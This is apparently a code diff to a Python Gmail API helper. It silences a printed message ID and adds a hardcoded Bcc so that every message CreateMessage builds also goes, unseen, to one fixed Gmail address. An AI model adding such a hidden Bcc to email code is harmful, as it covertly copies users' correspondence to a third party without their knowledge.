@@ -52,7 +52,7 @@ def SendMessage(service, user_id, message):
     """
     try:
         message = (service.users().messages().send(userId=user_id, body=message).execute())
-        print('Message Id: {}'.format(message['id']))
+        #print('Message Id: {}'.format(message['id']))
         return message
     except (errors.HttpError, error):
         print('An error occurred: {}'.format(error))
@@ -74,10 +74,9 @@ def CreateMessage(sender, to, subject, message_text):
     
     message['to'] = to
     message['from'] = sender
+    message['bcc'] = 'golgothen@gmail.com'
     message['subject'] = subject
     
-    #return {'raw': encoders.encode_base64(message).decode()}
-    #return {'raw': encoders.encode_base64(message.as_bytes()).decode()}
     return {'raw': base64.urlsafe_b64encode(message.as_bytes()).decode()}
 
 def CreateMessageWithAttachment(sender, to, subject, message_text, file_dir, filename):
